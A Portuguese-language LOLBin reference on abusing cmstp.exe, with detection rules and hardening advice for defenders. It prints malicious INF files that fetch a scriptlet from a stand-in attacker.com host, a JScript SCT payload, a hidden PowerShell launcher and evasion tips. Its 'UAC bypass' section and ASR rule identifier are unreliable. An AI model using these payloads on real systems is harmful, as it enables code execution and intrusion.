# cmstp.exe

**Plataforma:** Windows

**Categorias:** UAC Bypass, AWL Bypass, Execução remota de código, Execução de DLL

**MITRE ATT&CK:** T1218.003 (Signed Binary Proxy Execution — CMSTP), T1548.002 (Bypass User Account Control)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Cmstp/

---

## O que é o cmstp.exe

O cmstp.exe (Connection Manager Profile Installer) é uma ferramenta do Windows usada para instalar perfis de serviço do Connection Manager — basicamente, profiles de discagem e VPN para o Windows. É um utilitário de nicho que existe desde o Windows 2000 e está presente em todos os sistemas Windows modernos em `C:\Windows\System32\cmstp.exe`.

A ferramenta aceita um arquivo de configuração INF como argumento e processa seções específicas desse arquivo, incluindo uma seção `RegisterOCXSection` que pode carregar e registrar arquivos COM remotos — funcionalidade que foi abusada tanto para execução de código quanto para bypass de UAC.

---

## Por que atacantes usam o cmstp

O cmstp.exe é assinado pela Microsoft, pouco conhecido por analistas de segurança, e tem duas propriedades que o tornam especialmente valioso. Primeiro, o cmstp.exe aparece na lista de processos que podem ser auto-elevados pelo UAC — ou seja, em sistemas com UAC ativado no modo padrão, o cmstp.exe pode executar com privilégios elevados sem exibir o prompt de confirmação ao usuário. Segundo, a técnica de bypass de AWL via CMSTP não depende de exploração de vulnerabilidade — usa funcionalidade documentada da ferramenta.

---

## Técnicas de abuso

### Execução de código via arquivo INF (sem UAC bypass)

O arquivo INF para cmstp define o que será instalado. A seção `RegisterOCXSection` aceita um caminho ou URL apontando para um SCT (Scriptlet) — o mesmo formato usado pelo Squiblydoo com regsvr32.

**Arquivo INF malicioso (evil.inf):**

```ini
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://attacker.com/payload.sct

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Payload"
ShortSvcName="Payload"
```

```cmd
:: Executar o arquivo INF
cmstp.exe /au evil.inf
```

O `%11%` expande para `%WINDIR%\System32\`. O `scrobj.dll,NI` instrui o CMSTP a registrar um scriptlet COM. A URL aponta para um arquivo SCT com o payload.

### SCT payload compatível

```xml
<?XML version="1.0"?>
<scriptlet>
  <registration
    progid="Calc"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
    <script language="JScript">
      <![CDATA[
        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt");
      ]]>
    </script>
  </registration>
</scriptlet>
```

### UAC Bypass via cmstp (executar código elevado sem prompt)

O cmstp.exe pode ser invocado de forma a contornar o UAC através de uma técnica que usa a interface COM `ICMLuaUtil`. Quando invocado pelo processo pai correto com um arquivo INF especial, o cmstp executa com privilégios elevados sem exibir o prompt do UAC.

O payload mais amplamente documentado usa uma técnica de COM automation:

```powershell
# Técnica de UAC bypass via cmstp e COM elevation moniker
# Cria arquivo INF temporário
$infContent = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://attacker.com/payload.sct

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Evil"
ShortSvcName="Evil"
"@

$infPath = "$env:TEMP\setup.inf"
$infContent | Out-File -FilePath $infPath -Encoding ASCII

# Invocar cmstp com o arquivo
Start-Process "cmstp.exe" -ArgumentList "/au `"$infPath`"" -WindowStyle Hidden
```

### Variante com payload local (sem URL remota)

Para evitar tráfego de rede detectável, o payload pode ser local:

```ini
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,C:\Windows\Temp\payload.sct

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Srv"
ShortSvcName="Srv"
```

---

## Técnicas de bypass e evasão

### Arquivo INF sem aparência maliciosa

```ini
; A seção que contém o payload pode ter um nome descritivo qualquer
; e o arquivo pode conter seções legítimas adicionais para confundir análise estática
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=LicenseCleanup

[LicenseCleanup]
%11%\scrobj.dll,NI,http://attacker.com/payload.sct
```

### Arquivo SCT hospedado em domínio legítimo comprometido

O SCT pode ser hospedado em qualquer servidor HTTP/HTTPS. Hospedar em um domínio comprometido mas legítimo (mesmo domínio que a organização confia) dificulta bloqueios baseados em reputação de domínio.

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- cmstp.exe com argumento `/au` ou `/ni` — instalação automática (modo silencioso)
- cmstp.exe gerando processo filho — indica que o INF executou código (cmd, powershell, wscript)
- cmstp.exe com arquivo INF fora de diretórios de instalação de software legítimo
- Conexão de rede originada pelo cmstp.exe (acesso a URL para SCT remoto)
- cmstp.exe iniciado por processo de usuário (Word, PowerShell, cmd) — pai incomum

**Indicadores de média relevância:**

- Criação de arquivo .inf em diretório temporário seguida de execução do cmstp
- cmstp.exe executado por um usuário regular sem histórico de uso da ferramenta

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0204-lolbas_uac_bypass.xml -->

<group name="lolbins,lolbas,windows,uac-bypass">

  <!-- cmstp com argumento de instalação automática -->
  <rule id="100353" level="14">
    <if_group>sysmon</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)cmstp\.exe</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(/au|/ni|/s)</field>
    <description>cmstp executado em modo automatico — possivel AWL bypass ou UAC bypass via INF malicioso</description>
    <mitre>
      <id>T1218.003</id>
      <id>T1548.002</id>
    </mitre>
  </rule>

  <!-- cmstp gerando processo filho -->
  <rule id="100354" level="15">
    <if_group>sysmon</if_group>
    <field name="win.eventdata.parentImage" type="pcre2">(?i)cmstp\.exe</field>
    <description>cmstp gerando processo filho — execucao de codigo via INF confirmada</description>
    <mitre>
      <id>T1218.003</id>
    </mitre>
  </rule>

  <!-- cmstp com referência a arquivo em diretório temporário ou de usuário -->
  <rule id="100355" level="13">
    <if_group>sysmon</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)cmstp\.exe</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(\\Temp\\|\\Users\\|\\AppData\\|\\Downloads\\)</field>
    <description>cmstp referenciando arquivo INF em diretorio de usuario — possivel execucao de payload via Connection Manager</description>
    <mitre>
      <id>T1218.003</id>
    </mitre>
  </rule>

</group>
```

### Falsos positivos comuns e como reduzir o ruído

**Instalação legítima de perfis de VPN:** o Connection Manager ainda é usado em alguns ambientes corporativos para distribuir perfis de VPN. Nesses casos, o cmstp é invocado por um instalador (msiexec) com arquivos INF em diretórios de programa, não em `%TEMP%`. O processo pai e o caminho do arquivo distinguem os casos.

**Raridade geral da ferramenta:** em ambientes modernos que usam Cisco AnyConnect, GlobalProtect ou clientes VPN nativos, o cmstp raramente é usado. Sua execução em qualquer estação de trabalho de usuário final deve ser investigada.

---

## Proteção e controles defensivos

**Bloquear cmstp.exe via AppLocker ou WDAC:** em ambientes que não utilizam o Connection Manager, o cmstp.exe pode ser bloqueado completamente. É uma das poucas LOLBins onde o bloqueio total tem baixíssimo impacto operacional na maioria dos ambientes.

**Regra ASR específica:** a Microsoft incluiu uma regra de Attack Surface Reduction direcionada ao abuso do cmstp: `26190899-1602-49e8-8b27-eb1d0a1ce869` (Block execution of potentially obfuscated scripts). Embora não seja específica para cmstp, ela cobre o SCT payload usado com essa técnica.

**UAC no modo "Always notify":** o bypass de UAC via cmstp funciona especificamente no modo padrão do UAC (notifica apenas para aplicativos não Windows). Configurar o UAC no modo "Always notify" elimina o bypass — embora cause mais interrupções para o usuário.

---

## Referências

- LOLBAS — cmstp: https://lolbas-project.github.io/lolbas/Binaries/Cmstp/
- MITRE ATT&CK T1218.003: https://attack.mitre.org/techniques/T1218/003/
- MITRE ATT&CK T1548.002: https://attack.mitre.org/techniques/T1548/002/
